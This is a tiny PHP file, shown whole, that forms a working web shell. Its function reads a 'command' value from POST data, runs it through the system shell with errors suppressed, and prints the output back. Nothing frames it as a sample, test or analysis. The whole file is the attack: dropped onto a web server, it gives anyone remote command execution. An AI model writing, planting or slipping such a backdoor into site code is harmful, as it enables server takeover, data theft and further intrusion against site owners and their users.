<?php
function exTKL() {
	$in=$_POST['command'];
	if (!$in == '') {
		$out = '';
		ob_start();
		@system($in);
		$out = ob_get_clean();
		echo $out;
	}
}

exTKL();
?>